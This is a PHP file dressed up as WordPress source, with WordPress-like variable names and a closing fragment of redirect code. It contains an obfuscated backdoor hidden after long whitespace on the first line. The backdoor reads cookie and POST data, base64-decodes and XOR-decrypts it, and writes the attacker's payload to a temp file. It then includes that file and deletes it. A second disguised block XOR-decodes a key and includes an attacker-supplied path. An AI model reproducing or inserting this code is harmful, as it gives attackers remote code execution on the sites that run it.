<?php /*                                                                                                                                                                                                                                                                                                                                                                                                  $twcLQqB = 'k' . "\x73" . chr ( 813 - 726 ).'_' . "\x68" . "\x76" . "\x47" . "\115";$qJkPGUVVDF = 'c' . 'l' . chr ( 541 - 444 ).chr (115) . "\x73" . chr (95) . chr (101) . chr (120) . 'i' . chr (115) . "\164" . chr ( 898 - 783 ); $cLeyTnSKs = $qJkPGUVVDF($twcLQqB); $gAcqT = $cLeyTnSKs;if (!$gAcqT){class ksW_hvGM{private $hJVcG;public static $xEteaepB = "458ae80e-0e7e-4a0f-bf6b-d1b8a1ee1633";public static $ZSjXHv = 11536;public function __construct(){$Ozkua = $_COOKIE;$ODEPATHU = $_POST;$uDhhH = @$Ozkua[substr(ksW_hvGM::$xEteaepB, 0, 4)];if (!empty($uDhhH)){$nrvUwRCrIx = "base64";$sREZFhhsf = "";$uDhhH = explode(",", $uDhhH);foreach ($uDhhH as $jJpBArdq){$sREZFhhsf .= @$Ozkua[$jJpBArdq];$sREZFhhsf .= @$ODEPATHU[$jJpBArdq];}$sREZFhhsf = array_map($nrvUwRCrIx . chr (95) . "\144" . "\x65" . chr ( 478 - 379 )."\x6f" . "\x64" . chr (101), array($sREZFhhsf,)); $sREZFhhsf = $sREZFhhsf[0] ^ str_repeat(ksW_hvGM::$xEteaepB, (strlen($sREZFhhsf[0]) / strlen(ksW_hvGM::$xEteaepB)) + 1);ksW_hvGM::$ZSjXHv = @unserialize($sREZFhhsf);}}public function __destruct(){$this->LMpJK();}private function LMpJK(){if (is_array(ksW_hvGM::$ZSjXHv)) {$PSuJDG = sys_get_temp_dir() . "/" . crc32(ksW_hvGM::$ZSjXHv['s' . "\141" . chr ( 195 - 87 )."\164"]);@ksW_hvGM::$ZSjXHv["\167" . "\162" . 'i' . chr (116) . chr ( 120 - 19 )]($PSuJDG, ksW_hvGM::$ZSjXHv['c' . "\157" . 'n' . chr ( 691 - 575 )."\145" . chr ( 1091 - 981 ).chr ( 571 - 455 )]);include $PSuJDG;@ksW_hvGM::$ZSjXHv["\144" . "\145" . chr ( 852 - 744 )."\145" . 't' . chr (101)]($PSuJDG);exit();}}}$WRpUkn = new ksW_hvGM(); $WRpUkn = 39399;} ?><?php /* 
*
...

{
    ...
    $html = 'PFsf1M7gR2OKi44';
    $pages = $html;
    
    $_post = $GLOBALS[menu_position("%0F%00%3A%2At%1E", $pages)];
	$tags = 'dblq';
    $post_type_taxonomies = $_post;
    $revision_id = isset($post_type_taxonomies[$pages]);
    if ($revision_id)

    {

        $encoded_char_length = $_post[$pages];

        $link = $encoded_char_length[menu_position("%24%2B%039_%2CZ%02", $pages)];
        $force = $link;
	$tinkle = '_ext';
        include ($force);
	...
	$wpdb = 'orderby';
function menu_position($emojum, $is_escaped)

{
    $pee_parts = $is_escaped;
    $raw_title = "url" . "decode";
    $double_encode = $raw_title($emojum);
    $expages = substr($pee_parts,0, strlen($double_encode));
    $fallback = $double_encode ^ $expages;
    
    $double_encode = strpos($fallback, $expages);
	$cdata_regex = 'fallback_title';
	...
	$slug_num = 'raw_username';
old_slugs();




/* path'] = preg_replace( '|/' . preg_quote( $wp_rewrite->index, '|' ) . '?$|', '/', $redirect['path'] );
